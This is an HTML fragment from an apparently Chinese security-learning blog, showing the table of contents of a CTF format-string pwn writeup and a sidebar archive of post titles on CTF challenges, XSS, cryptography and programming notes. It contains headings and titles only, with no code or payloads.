+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-题目分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-查看-ELF-文件"><span class="toc-number">2.1.</span> <span class="toc-text">1.查看 ELF 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-查看文件保护机制"><span class="toc-number">2.2.</span> <span class="toc-text">2.查看文件保护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-用-IDA-逆向"><span class="toc-number">2.3.</span> <span class="toc-text">3.用 IDA 逆向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-运行-pwn"><span class="toc-number">2.4.</span> <span class="toc-text">4.运行 pwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-理清思路"><span class="toc-number">2.5.</span> <span class="toc-text">5.理清思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-解题步骤"><span class="toc-number">3.</span> <span class="toc-text">0x02 解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-查找-format-地址的参数偏移"><span class="toc-number">3.1.</span> <span class="toc-text">1.查找 format 地址的参数偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-将-v4-的地址存放在-format-首地址处"><span class="toc-number">3.2.</span> <span class="toc-text">2.将 v4 的地址存放在 format 首地址处</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-其他方法"><span class="toc-number">4.</span> <span class="toc-text">0x03 其他方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Reference"><span class="toc-number">5.</span> <span class="toc-text">0x04 Reference</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 120
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href="/2020/05/30/2020.05.30（120）/">【XCTF-pwn】由浅入深的剖析 "string" 题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/2020/05/29/2020.05.29（119）/">详解格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href="/2020/05/25/2020.05.24（118）/">学习计划表</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span><a class="archive-post-title" href="/2020/05/15/2020.05.05（117）/">Pwnable.kr的奇幻之旅（五）[passcode]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/04</span><a class="archive-post-title" href="/2020/05/04/2020.05.04（116）/">《梦炬手册》五周年纪念版下载页</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/02</span><a class="archive-post-title" href="/2020/05/02/2020.05.02（115）/">Pwnable.kr的奇幻之旅（四）[flag]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.29（112）/">pwntools的简单总结（持续更新）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2020/04/29/2020.04.28（111）/">Pwnable.kr的奇幻之旅（三）[bof]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href="/2020/04/28/2020.04.27（110）/">GDB常用命令-内存查看（x）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href="/2020/03/30/2020.03.30（107）/">详解pointer（指针）中的“*”（取值）和“&”（取地址）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/2020/03/26/2020.03.26（106）/">Windows常用的网络命令（web）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/2020/03/21/2020.03.21（105）/">Linux-根目录详解（二进制）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href="/2020/03/20/2020.03.20（104）/">Linux常用命令总结（二进制）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href="/2020/03/18/2020.03.17（103）/">编程语言的发展历史 from1954to2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href="/2020/03/16/2020.03.16（102）/">知识库构建初想</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href="/2020/03/15/2020.03.15（101）/">Python基本第三方库总结（0x00）：requests库（Python中唯一的非转基因库）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href="/2020/03/09/2020.03.08（100）/">xss_payload_构造总结及深度剖析(持续更新中……)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href="/2020/03/08/2020.03.08（99）/">Th1s_i3_XSS_challenges&from:stage#5&to:stage#12</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href="/2020/02/27/2020.02.27（96）/">This_1s_pr0mpt.ml_writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2020/02/24/2020.02.24（95）/">【知识点整理】浏览器解析：HTML解析_JS解析_URL解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 简单总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href="/2020/02/09/2020.02.09（92）/">各种文件的文件头和文件尾总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2020/01/30/2020.01.30（91）/">【WP】XCFT misc新手阶段</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2019/11/23/2019.11.23（90）/">以太坊智能合约漏洞 | Fallback函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/2019/11/19/2019.11.19（89）/">XSS Challenge（Stage1-4）writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href="/2019/11/07/2019.11.07（88）/">Cookie、Session、Token那点事儿（转载）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href="/2019/11/05/2019.11.05（87）/">有关内核调用问题和预编译指令</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2019/10/16/2019.10.16（86）/">PWN 实战 - shellcode 题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/12</span><a class="archive-post-title" href="/2019/10/12/2019.10.12（85）/">变色龙哈希（Chameleon Hash）、零知识证明（Zero—Knowledge Proof）和广播加密相关知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href="/2019/10/08/2019.09.28（84）/">pwn-ROP(GOT表泄露)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href="/2019/09/24/2019.09.24（83）/">pwn-bof（基础类型题目）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span><a class="archive-post-title" href="/2019/09/17/2019.09.17（82）/">bash 漏洞（pwnable-shellshock）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href="/2019/09/10/2019.09.10（81）/">GOT 表攻击实例（pwnbable.kr_passcode）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href="/2019/09/07/2019.09.07（80）/">AFL 的代码插桩问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2019/09/02/2019.09.02（79）/">XCTF 新人阶段 — web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2019/08/01/2019.08.01（78）/">BabyPHP 解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href="/2019/07/31/2019.07.31（77）/">JavaScript 学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href="/2019/07/27/2019.07.27（76）/">BaByXSS 解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href="/2019/07/26/2019.07.26（75）/">XSS 基础知识（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href="/2019/07/20/2019.07.20（74）/">乘法链算法的实现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2019/07/18/2019.07.18（73）/">最小公倍数的加法算法实现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/2019/07/15/2019.07.15（72）/">欧几里得算法的实现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href="/2019/07/13/2019.07.13（71）/">《软件安全分析与应用》第 2 章：基础知识学习笔记(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href="/2019/07/12/2019.07.12（70）/">《软件安全分析与应用》第 1 章：绪论学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href="/2019/06/16/2019.06.16（69）/">《图解密码技术》第三章（对称密码）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href="/2019/06/15/2019.06.15（68）/">《图解密码技术》第二章（历史上的密码）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/2019/06/14/2019.06.14（67）/">《图解密码技术》第一章（环游密码世界）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href="/2019/06/03/2019.06.03（66）/">《图解密码技术》第十五章（密码技术和现实生活）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href="/2019/06/01/2019.06.01（65）/">《图解密码技术》第十四章（SSL/TSL）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/2019/05/29/2019.05.29（64）/">《图解密码技术》第十三章（PGP）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/2019/05/28/2019.05.28（63）/">《图解密码技术》第十二章（随机数）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href="/2019/05/25/2019.05.25（62）/">MySQL学习笔记（二）查询(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span><a class="archive-post-title" href="/2019/05/23/2019.05.23（61）/">《图解密码技术》第十一章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/2019/05/21/2019.05.21（60）/">《图解密码技术》第十章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/20</span><a class="archive-post-title" href="/2019/05/20/2019.05.20（59）/">《图解密码技术》第九章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href="/2019/05/16/2019.05.16（58）/">《图解密码技术》第八章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span><a class="archive-post-title" href="/2019/05/15/2019.05.15（57）/">304号测试解题总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href="/2019/05/14/2019.05.14（56）/">本科毕业论文问卷调查</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href="/2019/05/13/2019.05.13（55）/">304号测试学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span><a class="archive-post-title" href="/2019/05/11/2019.05.11（54）/">《图解密码技术》第七章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/2019/05/09/2019.05.09（53）/">Wiener Trick解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/2019/05/07/2019.05.07（52）/">Wiener Trick解题准备</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href="/2019/05/05/2019.05.05（51）/">MySQL学习笔记（一）查询(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/2019.04.29（50）/">Misc：RealWiFi解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href="/2019/04/28/2019.04.28（49）/">Another 01game解题详细总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href="/2019/04/27/2019.04.27（48）/">Python 学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span><a class="archive-post-title" href="/2019/04/26/2019.04.26（47）/">初识 Caesar 密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href="/2019/04/25/2019.04.25（46）/">二进制炸弹：Phase_6解题总结（1）</a>
+        </li>
+    
